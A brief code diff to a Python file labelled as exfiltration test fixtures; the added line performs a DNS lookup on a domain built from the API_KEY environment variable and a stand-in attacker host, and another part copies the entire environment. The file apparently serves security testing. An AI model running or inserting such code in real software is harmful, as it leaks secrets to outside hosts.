@@ -1,9 +1,10 @@
 # Exfiltration test fixtures
-import os, requests
+import os, requests, socket
 
 # DNS exfiltration
 secret = os.environ.get("API_KEY")
 domain = f"{secret}.evil.attacker.com"
+socket.gethostbyname(domain)
 
 # Environment harvesting
 all_env = os.environ.copy()
